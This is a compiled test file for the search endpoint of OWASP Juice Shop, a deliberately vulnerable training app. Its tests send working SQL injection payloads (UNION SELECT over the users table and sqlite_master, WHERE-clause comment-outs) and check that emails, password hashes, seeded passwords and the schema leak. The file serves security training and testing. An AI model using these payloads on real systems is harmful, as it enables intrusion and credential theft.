"use strict";
/*
 * Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const node_test_1 = require("node:test");
const strict_1 = __importDefault(require("node:assert/strict"));
const supertest_1 = __importDefault(require("supertest"));
const config_1 = __importDefault(require("config"));
const security = __importStar(require("../../lib/insecurity"));
const setup_1 = require("./helpers/setup");
const christmasProduct = config_1.default.get('products').filter(({ useForChristmasSpecialChallenge }) => useForChristmasSpecialChallenge)[0];
const pastebinLeakProduct = config_1.default.get('products').filter(({ keywordsForPastebinDataLeakChallenge }) => keywordsForPastebinDataLeakChallenge)[0];
let app;
(0, node_test_1.before)(async () => {
    const result = await (0, setup_1.createTestApp)();
    app = result.app;
}, { timeout: 60000 });
void (0, node_test_1.describe)('/rest/products/search', () => {
    void (0, node_test_1.it)('GET product search with no matches returns no products', async () => {
        const res = await (0, supertest_1.default)(app)
            .get('/rest/products/search?q=nomatcheswhatsoever');
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        strict_1.default.equal(res.body.data.length, 0);
    });
    void (0, node_test_1.it)('GET product search with one match returns found product', async () => {
        const res = await (0, supertest_1.default)(app)
            .get('/rest/products/search?q=o-saft');
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        strict_1.default.equal(res.body.data.length, 1);
    });
    void (0, node_test_1.it)('GET product search fails with error message that exposes ins SQL Injection vulnerability', async () => {
        const res = await (0, supertest_1.default)(app)
            .get("/rest/products/search?q=';");
        strict_1.default.equal(res.status, 500);
        strict_1.default.ok(res.headers['content-type']?.includes('text/html'));
        strict_1.default.ok(res.text.includes(`<h1>${config_1.default.get('application.name')} (Express`));
        strict_1.default.ok(res.text.includes('SQLITE_ERROR: near &quot;;&quot;: syntax error'));
    });
    void (0, node_test_1.it)('GET product search SQL Injection fails from two missing closing parenthesis', async () => {
        const res = await (0, supertest_1.default)(app)
            .get("/rest/products/search?q=' union select id,email,password from users--");
        strict_1.default.equal(res.status, 500);
        strict_1.default.ok(res.headers['content-type']?.includes('text/html'));
        strict_1.default.ok(res.text.includes(`<h1>${config_1.default.get('application.name')} (Express`));
        strict_1.default.ok(res.text.includes('SQLITE_ERROR: near &quot;union&quot;: syntax error'));
    });
    void (0, node_test_1.it)('GET product search SQL Injection fails from one missing closing parenthesis', async () => {
        const res = await (0, supertest_1.default)(app)
            .get("/rest/products/search?q=') union select id,email,password from users--");
        strict_1.default.equal(res.status, 500);
        strict_1.default.ok(res.headers['content-type']?.includes('text/html'));
        strict_1.default.ok(res.text.includes(`<h1>${config_1.default.get('application.name')} (Express`));
        strict_1.default.ok(res.text.includes('SQLITE_ERROR: near &quot;union&quot;: syntax error'));
    });
    void (0, node_test_1.it)('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns', async () => {
        const res = await (0, supertest_1.default)(app)
            .get("/rest/products/search?q=')) union select * from users--");
        strict_1.default.equal(res.status, 500);
        strict_1.default.ok(res.headers['content-type']?.includes('text/html'));
        strict_1.default.ok(res.text.includes(`<h1>${config_1.default.get('application.name')} (Express`));
        strict_1.default.ok(res.text.includes('SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns'));
    });
    void (0, node_test_1.it)('GET product search can create UNION SELECT with Users table and fixed columns', async () => {
        const res = await (0, supertest_1.default)(app)
            .get("/rest/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--");
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        const match = res.body.data.find((item) => item.id === '1' && item.name === '2' && item.description === '3' &&
            item.price === '4' && item.deluxePrice === '5' && item.image === '6' &&
            item.createdAt === '7' && item.updatedAt === '8');
        strict_1.default.ok(match, 'Expected to find a row with fixed column values from UNION SELECT');
    });
    void (0, node_test_1.it)('GET product search can create UNION SELECT with Users table and required columns', async () => {
        const res = await (0, supertest_1.default)(app)
            .get("/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--");
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        const adminMatch = res.body.data.find((item) => item.id === 1 && item.price === `admin@${config_1.default.get('application.domain')}` && item.deluxePrice === security.hash('admin123'));
        strict_1.default.ok(adminMatch, 'Expected admin user in UNION SELECT results');
        const jimMatch = res.body.data.find((item) => item.id === 2 && item.price === `jim@${config_1.default.get('application.domain')}` && item.deluxePrice === security.hash('ncc-1701'));
        strict_1.default.ok(jimMatch, 'Expected jim user in UNION SELECT results');
        const benderMatch = res.body.data.find((item) => item.id === 3 && item.price === `bender@${config_1.default.get('application.domain')}`);
        strict_1.default.ok(benderMatch, 'Expected bender user in UNION SELECT results');
        const bjoernMatch = res.body.data.find((item) => item.id === 4 && item.price === 'bjoern.kimminich@gmail.com' && item.deluxePrice === security.hash('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='));
        strict_1.default.ok(bjoernMatch, 'Expected bjoern user in UNION SELECT results');
        const cisoMatch = res.body.data.find((item) => item.id === 5 && item.price === `ciso@${config_1.default.get('application.domain')}` && item.deluxePrice === security.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb'));
        strict_1.default.ok(cisoMatch, 'Expected ciso user in UNION SELECT results');
        const supportMatch = res.body.data.find((item) => item.id === 6 && item.price === `support@${config_1.default.get('application.domain')}` && item.deluxePrice === security.hash('J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P'));
        strict_1.default.ok(supportMatch, 'Expected support user in UNION SELECT results');
    });
    void (0, node_test_1.it)('GET product search can create UNION SELECT with sqlite_master table and required column', async () => {
        const res = await (0, supertest_1.default)(app)
            .get("/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--");
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        const basketItemsMatch = res.body.data.find((item) => item.id === 'CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))');
        strict_1.default.ok(basketItemsMatch, 'Expected BasketItems CREATE TABLE in UNION SELECT results');
        const sqliteSequenceMatch = res.body.data.find((item) => item.id === 'CREATE TABLE sqlite_sequence(name,seq)');
        strict_1.default.ok(sqliteSequenceMatch, 'Expected sqlite_sequence CREATE TABLE in UNION SELECT results');
    });
    void (0, node_test_1.it)('GET product search cannot select logically deleted christmas special by default', async () => {
        const res = await (0, supertest_1.default)(app)
            .get('/rest/products/search?q=seasonal%20special%20offer');
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        strict_1.default.equal(res.body.data.length, 0);
    });
    void (0, node_test_1.it)('GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination', async () => {
        const res = await (0, supertest_1.default)(app)
            .get("/rest/products/search?q=seasonal%20special%20offer'))--");
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        strict_1.default.equal(res.body.data.length, 0);
    });
    void (0, node_test_1.it)('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause', async () => {
        const res = await (0, supertest_1.default)(app)
            .get(`/rest/products/search?q=${christmasProduct.name}'))--`);
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        strict_1.default.equal(res.body.data.length, 1);
        strict_1.default.equal(res.body.data[0].name, christmasProduct.name);
    });
    void (0, node_test_1.it)('GET product search can select logically deleted unsafe product by forcibly commenting out the remainder of where clause', async () => {
        const res = await (0, supertest_1.default)(app)
            .get(`/rest/products/search?q=${pastebinLeakProduct.name}'))--`);
        strict_1.default.equal(res.status, 200);
        strict_1.default.ok(res.headers['content-type']?.includes('application/json'));
        strict_1.default.equal(res.body.data.length, 1);
        strict_1.default.equal(res.body.data[0].name, pastebinLeakProduct.name);
    });
    void (0, node_test_1.it)('GET product search with empty search parameter returns all products', async () => {
        const productsRes = await (0, supertest_1.default)(app)
            .get('/api/Products');
        strict_1.default.equal(productsRes.status, 200);
        strict_1.default.ok(productsRes.headers['content-type']?.includes('application/json'));
        const products = productsRes.body.data;
        const searchRes = await (0, supertest_1.default)(app)
            .get('/rest/products/search?q=');
        strict_1.default.equal(searchRes.status, 200);
        strict_1.default.ok(searchRes.headers['content-type']?.includes('application/json'));
        strict_1.default.equal(searchRes.body.data.length, products.length);
    });
    void (0, node_test_1.it)('GET product search without search parameter returns all products', async () => {
        const productsRes = await (0, supertest_1.default)(app)
            .get('/api/Products');
        strict_1.default.equal(productsRes.status, 200);
        strict_1.default.ok(productsRes.headers['content-type']?.includes('application/json'));
        const products = productsRes.body.data;
        const searchRes = await (0, supertest_1.default)(app)
            .get('/rest/products/search');
        strict_1.default.equal(searchRes.status, 200);
        strict_1.default.ok(searchRes.headers['content-type']?.includes('application/json'));
        strict_1.default.equal(searchRes.body.data.length, products.length);
    });
});
//# sourceMappingURL=search.test.js.map